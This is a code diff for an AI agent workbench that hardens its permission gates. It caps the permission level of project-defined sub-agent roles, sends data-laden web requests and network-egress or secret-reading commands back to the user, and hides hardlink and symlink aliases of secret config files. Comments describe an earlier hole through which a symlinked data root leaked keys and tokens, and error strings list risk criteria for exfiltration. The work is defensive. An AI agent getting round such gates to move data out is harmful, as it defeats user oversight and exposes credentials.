+            // 安全走查 S3:角色自带档(项目来源的先夹到不高于父档)排在 permModeOverride / 父线程实时档前面的优先级逐字不变 —— 只是项目角色那一档不再能比父档宽。
+            const parentModeNow = permModeOverride || liveParentPermissionMode() || config.permissionMode;
+            const roleMode = clampAgentRoleToParent(role, tier, parentModeNow).permissionMode;
+            const effMode = permModeOverride === 'plan' ? 'plan' : (roleMode || parentModeNow);
             const gate = nativeToolGate(effMode, ntier, tc.name, args);
             // 2026-10 能力总闸补桥接面:内置桌面 MCP 里被设置关掉的工具在分发点拒绝(原生工具由下面的 toolCall 按 ctx 判,
             // 会话覆盖取 parentSession —— 这里取同一个,两边同口径)。
@@ -40214,7 +40674,14 @@ async function runSubAgentCoreBody({ parentSession, provider, config, task, disp
             if (bridgedPolicyOff) {
               resultObj = toolDisabledResult(tc.name, bridgedPolicyOff);
             } else if (gate !== 'allow') {
-              resultObj = { ok: false, error: `子代理无权执行 ${ntier} 级工具(权限模式 '${effMode}')` };
+              // 安全走查 S1:联网请求带疑似载荷(超长查询串 / 编码串)在除 bypass 外的档位要用户确认,子代理没有交互通道 —— 拒绝并说清缘由,别说成「无权执行 read 级工具」。
+              const webWhy = webPayloadReason(tc.name, args);
+              resultObj = webWhy
+                ? { ok: false, error: `这个联网请求的网址 / 查询看起来带了大段数据(${webWhy}),需要用户确认,子代理无法征求确认,已拒绝;请缩短后重试,或让主线程发起` }
+                : (effMode === 'auto' && ntier === 'exec'
+                  // 智能自动档对 exec 只在命中高风险判据(网络外发 / 递归删除 / 推送发布 / 改系统 / 读数据根密钥 / 拼接编码求值)时问人,子代理无法征求确认。
+                  ? { ok: false, error: `子代理在「智能自动」档下不能执行这条命令:它命中了需要用户确认的高风险判据(网络外发、递归删除、推送 / 发布、改系统设置、读如意数据目录密钥,或命令是拼接 / 编码出来的),子代理无法征求确认,已拒绝;请改用更安全的写法,或让主线程发起` }
+                  : { ok: false, error: `子代理无权执行 ${ntier} 级工具(权限模式 '${effMode}')` });
             } else if (bridge) {
               const client = await getBridgedClient(bridge.serverId, config); // 47b:死/缺自动重连(超时杀后自愈)
               if (!client) resultObj = { ok: false, error: bridgedServerUnavailableMessage(bridge.serverId) };
@@ -42247,7 +42714,10 @@ async function runAgentWorkflow({ parentSession, provider, config, nodes: rawNod
     const baseOnEvent = onEvent;
     onEvent = evt => baseOnEvent(evt && typeof evt === 'object' && !evt.background ? { ...evt, background: true } : evt);
   }
-  const roleLibrary = new Map((await getAgentRoleLibrary(normalizeCwd(parentSession.cwd, config.defaultWorkspace), config)).map(role => [role.id, role]));
+  // 安全走查 S3:项目来源的角色按这次运行的父档(permModeOverride > 线程档)带上有效档位标注;节点工具级用夹过的那个(卡片如实显示)。
+  // 项目来源的角色在这里换成「夹后」的 toolTier(声明值留在 declaredToolTier):下面节点的 toolTier / 选模型都读 role.toolTier,卡片与快照如实显示夹后的档位。
+  const roleLibrary = new Map((await getAgentRoleLibrary(normalizeCwd(parentSession.cwd, config.defaultWorkspace), config, { parentMode: permModeOverride || config.permissionMode }))
+    .map(role => [role.id, (agentRoleIsUntrusted(role) && role.effectiveToolTier && role.effectiveToolTier !== role.toolTier) ? { ...role, declaredToolTier: role.toolTier, toolTier: role.effectiveToolTier } : role]));
   let defaultRoute = {
     engine: parentEngine === 'claude' ? 'claude' : (provider ? 'openai' : 'claude'),
     provider: provider || null,
@@ -42368,7 +42838,9 @@ async function runAgentWorkflow({ parentSession, provider, config, nodes: rawNod
       if (roleId && !role) return { ok: false, error: `节点 ${id} 引用了不存在的角色: ${roleId}`, startedCount: 0 };
       ids.add(id);
       const resourceSpecs = normalizeAgentResources(raw.resources, normalizeCwd(parentSession.cwd, config.defaultWorkspace));
-      const explicitTier = ['read', 'edit', 'exec'].includes(raw.toolTier) ? raw.toolTier : '';
+      // 模型显式给的档位对项目来源的角色同样不得高于父档(clamp 只对 untrusted 角色生效,其余原样)。
+      const explicitTier0 = ['read', 'edit', 'exec'].includes(raw.toolTier) ? raw.toolTier : '';
+      const explicitTier = (explicitTier0 && role && agentRoleIsUntrusted(role)) ? clampAgentRoleToParent(role, explicitTier0, permModeOverride || config.permissionMode).toolTier : explicitTier0;
       const outputSchema = sanitizeAgentOutputSchema(raw.outputSchema);
       const gate = normalizeAgentGate(raw.gate, roleId);
       const failurePolicy = ['block', 'continue', 'retry'].includes(raw.failurePolicy) ? raw.failurePolicy : 'block';
@@ -45375,8 +45847,9 @@ async function runOpenAiTurn({ session, message, attachments, cwd, onEvent, prov
           // F5 (安全·自防御): re-check the native tier at the decision point — do NOT rely on normalizeConfig
           // having cleansed the rule table upstream. Only read/edit-tier native tools may be auto-allowed by a
           // persistent rule; an exec/desktop rule (however it got into the file) can never short-circuit here.
+          // 安全走查 S1:联网请求带疑似载荷时的这一问,不被「始终允许」规则短路 —— 否则用户对一次长网址点过「始终允许」,保护就对所有后续请求永久失效。
           if (gate === 'ask' && !bridge && config.toolAllowRules && config.toolAllowRules[tc.name] === 'allow'
-              && (nativeToolTier(tc.name) === 'read' || nativeToolTier(tc.name) === 'edit')) gate = 'allow';
+              && (nativeToolTier(tc.name) === 'read' || nativeToolTier(tc.name) === 'edit') && !webPayloadReason(tc.name, args)) gate = 'allow';
           // 第27波:自主性授权书消耗点(native 主 gate)。仅在 gate==='ask' 且 !bridge 时介入(子集律:只 ask→allow);
           // 命中 → 就地降 allow + 计数 + 事件。exec/edit/read 全档可授,但均受 grant 的路径 glob / cmdAllow / TTL / 次数约束,
           // 且真正执行仍过 guardFileToolPath/SSRF/journal。子代理有独立 gate(runSubAgentCore),【不】走此处 → 不消耗父授权(R-P1-1)。
@@ -50827,6 +51300,9 @@ async function walkFiles(root, opts = {}) {
   // home/.ruyi-workbench)时,config.json/sessions/token 配置的内容仍被搜出返回。这里在遍历处逐项跳过敏感子树
   // (既不入结果也不下钻)。ensureDataRootReal 已在上游 guardFileToolPath(root) 预热,此处 sync 判定即可。
   await ensureDataRootReal();
+  // 安全走查 S7:config.json / runtime.json 的硬链接别名(同 inode 不同名)按 dev+ino 挡在 emit 处 —— 那里本来就要 stat 文件,
+  // nlink>1 的才多一次 bigint stat 比对;遍历到却不入结果的文件不付这个成本。ids 每次遍历现取一次(两个 stat)。
+  const sensitiveIds = await sensitiveFileIdentities();
   // 指向遍历根之外的符号链接/联接不返回:guardFileToolPath 只判了 root,修前 ws/link.md -> /outside/secret.md 被当成
   // 普通文件列出来,docs_search / codebase_symbol_search / code_review_scan 接着就把区外文件的内容读出来了
   // (file_read 读同一个链接是 not-allowed)。只对链接条目多做一次 realpath,普通文件不受影响。
@@ -50841,6 +51317,7 @@ async function walkFiles(root, opts = {}) {
   const emit = async (full, rel, isDir) => {
     // 目录不需要 stat(size 恒记 0;信封里目录不带 size);文件要 size,glob 还要 mtime。
     const stat = isDir ? null : await fsp.stat(full).catch(() => null);
+    if (stat && sensitiveIds.size && stat.nlink > 1 && await isSensitiveHardlinkAlias(full, sensitiveIds)) return;
     const rec = { path: full, relativePath: rel, type: isDir ? 'directory' : 'file', size: stat?.size || 0 };
     if (stat) rec.mtimeMs = Math.round(stat.mtimeMs);
     out.push(rec);
@@ -51305,9 +51782,11 @@ function ignoreGlobsForRg(opts, allowDirs) {
 function sensitiveGlobsForRg(base) {
   const globs = [];
   try {
-    const roots = [...new Set([dataRoot(), ...dataRootAliases()])];
+    // 安全走查 S7:名单与 03 的 isSensitiveDataPath 内的那份一致(unit/unc-and-traversal-gates.test.js 逐名比对);根要把【realpath 后的数据根】也算进来 ——
+    // 遍历根已换成 guardFileToolPath 给的 realpath,词法数据根与它不一定同一拼法(联接 / 短名 / 大小写),只认词法会让 !glob 落空。
+    const roots = [...new Set([dataRoot(), ...(_dataRootReal ? [_dataRootReal] : []), ...dataRootAliases()])];
     for (const r of roots) {
-      for (const n of ['config.json', 'runtime.json', 'sessions', 'memory', 'usage', 'logs', 'generated', 'agent-runs']) {
+      for (const n of ['config.json', 'runtime.json', 'sessions', 'memory', 'usage', 'logs', 'generated', 'agent-runs', 'steward', 'missions', 'scheduler', 'migrations', 'engine-transcripts.json']) {
         const rel = path.relative(base, path.join(r, n));
         if (rel && !rel.startsWith('..') && !path.isAbsolute(rel)) globs.push('!/' + rel.split(path.sep).join('/'));
       }
@@ -54673,6 +55152,7 @@ async function zipCollectEntries(rootPaths, opts = {}) {
     if (isSensitiveDataPath(absPath)) { entries.skippedSensitive += 1; return; }
     const st = await fsp.lstat(absPath);
     if (st.isSymbolicLink()) { entries.skippedLinks += 1; return; } // 安全：符号链接不入包（避免打进包外内容）
+    if (st.isFile() && st.nlink > 1 && await isSensitiveHardlinkAlias(absPath)) { entries.skippedSensitive += 1; return; } // 安全走查 S7:config.json / runtime.json 的硬链接别名不入包
     if (st.isDirectory()) {
       entries.push({ name: zipName.replace(/\/?$/, '/'), data: Buffer.alloc(0), isDir: true });
       const kids = await fsp.readdir(absPath, { withFileTypes: true });
@@ -57224,11 +57704,12 @@ const FILE_TOOL_HANDLERS = {
       if (!g.ok) return { ok: false, error: g.error, code: g.code, root };
       const rootBad = await toolRootProblem(root);
       if (rootBad) return rootBad;
+      const walkRoot = guardedWalkRoot(root, g);
       // F13:pattern 是正则;写成 glob(`*.js`)的按 glob 处理并说明,真正非法的给 bad_pattern + hint(修前是原始 SyntaxError)。
       const cls = classifyListPattern(args.pattern, root);
       if (cls.kind === 'invalid') return { ok: false, error: cls.error, code: 'bad_pattern', hint: cls.hint, root };
       const recursive = args.recursive !== false;
-      const walked = await walkFiles(root, {
+      const walked = await walkFiles(walkRoot, {
         recursive, maxFiles: args.maxFiles, maxDepth: args.maxDepth, ignoreCase: args.ignoreCase,
         pattern: cls.kind === 'regex' ? String(args.pattern) : '', accept: cls.kind === 'glob' ? cls.accept : null,
         // 递归列举:广度优先(先把浅层列全);非递归 = 目录浏览,只藏 node_modules/.git/.venv(build/dist 也要能点开看)。
@@ -57252,16 +57733,27 @@ const FILE_TOOL_HANDLERS = {
       if (!g.ok) return { ok: false, error: g.error, code: g.code, root };
       const rootBad = await toolRootProblem(root);
       if (rootBad) return rootBad;
+      const walkRoot = guardedWalkRoot(root, g);
       // maxResults ≤0 / 非数字按没传(200)—— 修前 0 或负数让两个引擎都立刻停在 0 条并报 truncated。
       const maxResultsReq = Number(args.maxResults);
       const maxResults = args.maxResults != null && maxResultsReq >= 1 ? Math.floor(maxResultsReq) : 200;
-      let matches = await searchFileContent(root, String(args.pattern || ''), { ...args, maxResults });
+      let matches = await searchFileContent(walkRoot, String(args.pattern || ''), { ...args, maxResults });
       // 审计 P1(对抗轮补漏): JS 扫描路径已在 walkFiles 跳过敏感子树;rg 路径不经 walkFiles,这里补一道结果层过滤
       // (对 flat 与 group:true 两种形态,项内都带 .path)。ensureDataRootReal 已由上游 guardFileToolPath(root) 预热。
       const regexTimedOut = !!(matches && matches.regexTimedOut);   // 审计 F:JS 正则撞了时间预算
       // 数组上挂的元数据(JSON.stringify 会丢),filter 之前先取出来。
       const meta = matches || {};
-      if (Array.isArray(matches)) matches = matches.filter(m => !isSensitiveDataPath(m && m.path));
+      if (Array.isArray(matches)) {
+        // 安全走查 S7:rg 路径不经 walkFiles,结果层再按 dev+ino 挡一道硬链接别名(只对命中的那几个文件 stat,不是对遍历的每个文件)。
+        const ids = await sensitiveFileIdentities();
+        const kept = [];
+        for (const m of matches) {
+          if (isSensitiveDataPath(m && m.path)) continue;
+          if (ids.size && m && m.path && await isSensitiveHardlinkAlias(m.path, ids)) continue;
+          kept.push(m);
+        }
+        matches = kept;
+      }
       const resp = { ok: true, root, matches };
       if (meta.engine) resp.engine = meta.engine;
       // 只有【上限之后确实还有命中】才报截断(修前命中数恰好等于 maxResults 也报 truncated:true,模型白白再搜一轮)。
@@ -57302,10 +57794,12 @@ const FILE_TOOL_HANDLERS = {
       if (!g.ok) return { ok: false, error: g.error, code: g.code, root };
       const rootBad = await toolRootProblem(root);
       if (rootBad) return rootBad;
+      const walkRoot = guardedWalkRoot(root, g);   // 安全走查 S7:遍历用 realpath 根
       const rawPattern = String(args.pattern || '');
       if (!rawPattern) return { ok: false, code: 'invalid-arguments', error: 'pattern is required and must be non-empty', root, hint: '例如 "**/*.js" 或 "src/**/test_*.py"' };
       // 前导 ./ 与「落在 root 内的绝对路径 pattern」改写成相对 root 的写法;root 之外的绝对 pattern 配不到任何东西 —— 明说,别静默回空表。
-      const gp = normalizeGlobPatternForRoot(rawPattern, root);
+      let gp = normalizeGlobPatternForRoot(rawPattern, root);
+      if (gp.outside && walkRoot !== root) { const gpReal = normalizeGlobPatternForRoot(rawPattern, walkRoot); if (!gpReal.outside) gp = gpReal; }   // 绝对 pattern 按 realpath 根写的也认
       if (gp.outside) return { ok: true, root, files: [], truncated: false, patternNote: gp.note };
       const pattern = gp.pattern;
       if (!pattern) return { ok: false, code: 'invalid-arguments', error: 'pattern is empty after removing "./"', root, hint: '例如 "**/*.js" 或 "src/**/test_*.py"' };
@@ -57314,10 +57808,10 @@ const FILE_TOOL_HANDLERS = {
       // F2:glob 在遍历时过滤(accept),maxFiles 只数【命中】的文件 —— 修前先按遍历顺序取前 max(4×maxResults,4000)
       // 个条目(含目录、无关文件)再事后匹配,前面塞满 __pycache__/.github 时 `**/*.md` 一个都找不到。
       const scanCap = Math.max(maxResults * 4, 4000);
-      const all = await walkFiles(root, {
+      const all = await walkFiles(walkRoot, {
         recursive: true, maxFiles: scanCap, maxDepth: args.maxDepth != null ? Number(args.maxDepth) : 12,
         emitDirs: false, accept: rel => globRe.test(rel), ignoreDirs: args.ignoreDirs, includeIgnored: args.includeIgnored === true,
-        allowDirs: explicitAllowDirs(root, explicitSegmentsOfGlob(pattern)),   // `dist/**/*.js` 点名了 dist → 不剪
+        allowDirs: explicitAllowDirs(walkRoot, explicitSegmentsOfGlob(pattern)),   // `dist/**/*.js` 点名了 dist → 不剪
       });
       const matched = all.filter(f => f.type === 'file').map(f => ({ path: f.path, relativePath: f.relativePath, mtime: f.mtimeMs || 0 }));
       matched.sort((a, b) => b.mtime - a.mtime);
@@ -57339,9 +57833,10 @@ const FILE_TOOL_HANDLERS = {
       if (!g.ok) return { ok: false, error: g.error, code: g.code, root };
       const rootBad = await toolRootProblem(root);
       if (rootBad) return rootBad;
+      const walkRoot = guardedWalkRoot(root, g);   // 安全走查 S7:遍历用 realpath 根
       // F2/F12:广度优先 + 共用忽略清单 —— 顶层条目永远先于任何子目录内容列出(修前 DFS 先到先得,
       // 本仓库上 300 个名额全被 .claude/worktrees 吃掉);信封只带相对路径。
-      const walked = await walkFiles(root, { recursive: true, maxFiles: Number(args.maxFiles) >= 1 ? args.maxFiles : 300, maxDepth: args.maxDepth != null ? Number(args.maxDepth) : 4, bfs: true, ignoreDirs: args.ignoreDirs, includeIgnored: args.includeIgnored === true, allowDirs: explicitAllowDirs(root, []) });
+      const walked = await walkFiles(walkRoot, { recursive: true, maxFiles: Number(args.maxFiles) >= 1 ? args.maxFiles : 300, maxDepth: args.maxDepth != null ? Number(args.maxDepth) : 4, bfs: true, ignoreDirs: args.ignoreDirs, includeIgnored: args.includeIgnored === true, allowDirs: explicitAllowDirs(walkRoot, []) });
       const resp = { ok: true, root, files: walkEnvelopeEntries(walked, args.absolute === true) };
       if (walked.truncated) { resp.truncated = true; resp.hint = walkTruncationHint(walked, 'project_snapshot') + ' (entries are listed breadth-first: every top-level entry comes before deeper ones)'; }
       if (walked.prunedDirs) { resp.prunedDirs = walked.prunedDirs; resp.prunedHint = prunedDirsHint('project_snapshot'); }
@@ -57602,6 +58097,14 @@ async function nearestGitignore(root) {
 }
 // 遍历/扫描类工具的 root 必须是一个已存在的目录:修前 root 写错(不存在、或是一个文件)时 file_list/glob/
 // file_search/project_snapshot/各类扫描一律回 ok:true + 空结果,模型把「路径写错了」读成「这里什么都没有」。
+// 安全走查 S7:遍历类工具(file_list / file_search / glob / project_snapshot / 各审计与符号检索)拿 guardFileToolPath 返回的【realpath】当遍历根。
+// 修前守门只校验了 root 参数的 realpath,遍历却按【词法】根走:工作区里一个指向数据根的符号链接 / 联接 linkdir 当 root 时,守门看到的
+// realpath 恰好等于允许根 dataRoot 本身(放行),而 walkFiles 的敏感子树剔除、rg 的 !glob、结果层过滤全是按 linkdir\config.json 这种词法路径比的,
+// 认不出它就是数据根里的 config.json —— 明文密钥与 token 被搜出来。换成 realpath 之后三处过滤看到的都是真实数据根路径。
+// 信封里回显的 root 仍是调用方给的写法(只换遍历用的那一份);守门没给 absPath(不该发生)时退回原 root。
+function guardedWalkRoot(root, g) {
+  return (g && typeof g.absPath === 'string' && g.absPath) ? g.absPath : root;
+}
 async function toolRootProblem(root) {
   let st = null;
   try { st = await fsp.stat(root); } catch { st = null; }
@@ -58046,7 +58549,7 @@ const CODE_TOOL_HANDLERS = {
       if (!g.ok) return { ok: false, error: g.error, code: g.code, root };
       const rootBad = await toolRootProblem(root);
       if (rootBad) return rootBad;
-      return dependencyInventory(root);
+      return dependencyInventory(guardedWalkRoot(root, g));
   } },
   code_review_scan: { paths: "read", guardNote: '', handler: async (args, ctx) => {
       const root = await resolveFileToolRoot(args, ctx);
@@ -58054,7 +58557,7 @@ const CODE_TOOL_HANDLERS = {
       if (!g.ok) return { ok: false, error: g.error, code: g.code, root };
       const rootBad = await toolRootProblem(root);
       if (rootBad) return rootBad;
-      return codeReviewScan(root, args);
+      return codeReviewScan(guardedWalkRoot(root, g), args);
   } },
   frontend_audit: { paths: "read", guardNote: '', handler: async (args, ctx) => {
       const root = await resolveFileToolRoot(args, ctx);
@@ -58062,7 +58565,7 @@ const CODE_TOOL_HANDLERS = {
       if (!g.ok) return { ok: false, error: g.error, code: g.code, root };
       const rootBad = await toolRootProblem(root);
       if (rootBad) return rootBad;
-      return frontendAudit(root, args);
+      return frontendAudit(guardedWalkRoot(root, g), args);
   } },
   claude_md_audit: { paths: "read", guardNote: '', handler: async (args, ctx) => {
       const root = await resolveFileToolRoot(args, ctx);
@@ -58070,7 +58573,7 @@ const CODE_TOOL_HANDLERS = {
       if (!g.ok) return { ok: false, error: g.error, code: g.code, root };
       const rootBad = await toolRootProblem(root);
       if (rootBad) return rootBad;
-      return claudeMdAudit(root);
+      return claudeMdAudit(guardedWalkRoot(root, g));
   } },
   docs_search: { paths: "read", guardNote: '', handler: async (args, ctx) => {
       const root = await resolveFileToolRoot(args, ctx);
@@ -58078,7 +58581,7 @@ const CODE_TOOL_HANDLERS = {
       if (!g.ok) return { ok: false, error: g.error, code: g.code, root };
       const rootBad = await toolRootProblem(root);
       if (rootBad) return rootBad;
-      return docsSearch(root, String(args.query || ''), args);
+      return docsSearch(guardedWalkRoot(root, g), String(args.query || ''), args);
   } },
   codebase_symbol_search: { paths: "read", guardNote: '', handler: async (args, ctx) => {
       // v2.6 (对抗验证 HIGH 收口): 与 file_search/file_list/glob/project_snapshot 同款读闸 —— 仅靠 walkFiles
@@ -58088,7 +58591,7 @@ const CODE_TOOL_HANDLERS = {
       if (!g.ok) return { ok: false, error: g.error, code: g.code, root };
       const rootBad = await toolRootProblem(root);
       if (rootBad) return rootBad;
-      return codebaseSymbolSearch(root, args);
+      return codebaseSymbolSearch(guardedWalkRoot(root, g), args);
   } },
   debug_hypothesis: { paths: null, guardNote: "纯确定性状态机计算,不触文件路径", handler: async (args, ctx) => {
       return debugHypothesis(args);
@@ -60963,7 +61466,12 @@ async function handleApi(req, res, pathname) {
     const nativeClaudeRoles = await readClaudeProjectAgentRoles(cwd);
     const claudeDefs = await buildClaudeAgentDefinitions(cwd, config);
     const mcpServers = [{ id: RUYI_MCP_SERVER_ID, label: 'Ruyi Workbench' }, ...resolveExternalMcpServers(config).map(s => ({ id: s.id, label: s.label || s.id }))];
-    return send(res, json({ ok: true, cwd, roles, builtinRoles, globalRoles, projectRoles, nativeClaudeRoles, mcpServers, drivers: { openai: { mode: 'workbench-native' }, claude: { mode: 'claude-native', flag: '--agents', synced: Object.keys(claudeDefs.definitions), omitted: claudeDefs.omitted } } }));
+    // 安全走查 S3:项目来源的角色带上【有效档位】标注(effectivePermissionMode / effectiveToolTier / roleClamped),按全局默认档夹;
+    // 角色自己声明的 permissionMode / toolTier 原样不动(设置页编辑器按它存回)。真正起跑时按那条线程的实际档再夹一次。
+    const parentModeForRoles = config.permissionMode;
+    const projectRolesView = projectRoles.map(r => annotateAgentRoleEffective(r, parentModeForRoles));
+    const nativeClaudeRolesView = nativeClaudeRoles.map(r => annotateAgentRoleEffective(r, parentModeForRoles));
+    return send(res, json({ ok: true, cwd, roles, builtinRoles, globalRoles, projectRoles: projectRolesView, nativeClaudeRoles: nativeClaudeRolesView, mcpServers, drivers: { openai: { mode: 'workbench-native' }, claude: { mode: 'claude-native', flag: '--agents', synced: Object.keys(claudeDefs.definitions), omitted: claudeDefs.omitted } } }));
   }
   if (req.method === 'POST' && pathname === '/api/agent-roles') {
     const body = await readJsonBody(req);
@@ -62011,6 +62519,8 @@ async function handleApi(req, res, pathname) {
     const session = sessionId ? await loadSession(sessionId) : null;
     const config = await readConfig();
     const roots = fileAllowedRoots(session, config);
+    // 安全走查 W1:非本机 UNC 在 realpath(会去连对方主机)之前拒,除非落在用户配置的 UNC 工作区里。
+    if (remoteUncDenial([rawPath, target], session, config)) return send(res, apiFailure('file.not_in_workspace', {}, 'path not in an allowed workspace', 403));
     // v0.9 F3: check the REALPATH (symlink-resolved) target, not the lexical path. A symlink living inside an
     // allowed root but pointing OUTSIDE it would otherwise pass the lexical containment check and leak an
     // arbitrary file. ENOENT/EPERM (missing/unresolvable) → fall back to `target` so readFilePreview surfaces a
@@ -62021,6 +62531,9 @@ async function handleApi(req, res, pathname) {
     await ensureDataRootReal();
     if (isSensitiveDataPath(target) || isSensitiveDataPath(real)) {
       return send(res, json({ ok: false, error: '该路径属于应用内部数据(配置/会话/记忆等),已禁止预览' }, 403));
+    }
+    if (await isSensitiveHardlinkAlias(real)) {   // 安全走查 S7:config.json / runtime.json 的硬链接别名
+      return send(res, apiFailure('file.internal_data', {}, '该路径属于应用内部数据(配置/会话/记忆等),已禁止预览', 403));
     }
     const realRoots = await Promise.all(roots.map(r => fsp.realpath(r).catch(() => r)));
     if (!pathWithinAnyRoot(real, realRoots)) {
@@ -71825,6 +72338,24 @@ async function stewardImplDecide(args, ctx, config) {
     return stewardFail('propose_required', `工具 ${stewardSanitizeText(toolName)} 这次要执行的命令是拼接、编码或求值出来的,看不出真正要跑什么 —— 这一条必须你亲自决定`, {
       reason: 'indirect_command', missionId, interventionId, type, toolName, tier, permissionMode,
       delegable: false, blockedBy: 'indirect_command',
+    });
+  }
+  // 安全走查 S2:命令里有网络外发 / 读数据根密钥文件(06i stewardAutoAskSensitiveKind,智能自动正是因为它才停下来问):不在五类豁免里,
+  // 但「外发什么、读了什么」管家同样判不出 —— 放行类一律交回用户,拒绝类照常可以。
+  if (type === 'permission' && !exemptHit && !refusing) {
+    const sensitiveKind = stewardAutoAskSensitiveKind(toolName, exemptInput);
+    if (sensitiveKind) {
+      return stewardFail('propose_required', `工具 ${stewardSanitizeText(toolName)} 这次要执行的命令会${sensitiveKind === 'dataroot' ? '读取如意数据目录里的密钥 / 状态文件' : '访问外部网络'},可能在外传数据 —— 这一条必须你亲自决定`, {
+        reason: sensitiveKind === 'dataroot' ? 'dataroot_read' : 'network_egress', missionId, interventionId, type, toolName, tier, permissionMode,
+        delegable: false, blockedBy: sensitiveKind === 'dataroot' ? 'dataroot_read' : 'network_egress',
+      });
+    }
+  }
+  // 安全走查 S1:联网请求带疑似载荷(超长查询串 / 编码串,07 webPayloadReason)—— 它是「可能在外传数据」的那一问,管家同样不替用户批,放行类一律交回用户。
+  if (type === 'permission' && !refusing && webPayloadReason(toolName, current.input)) {
+    return stewardFail('propose_required', `工具 ${stewardSanitizeText(toolName)} 这次的网址 / 查询带了大段数据,可能是在往外传内容 —— 这一条必须你亲自决定`, {
+      reason: 'web_payload', missionId, interventionId, type, toolName, tier, permissionMode,
+      delegable: false, blockedBy: 'web_payload',
     });
   }
   let delegation = null;
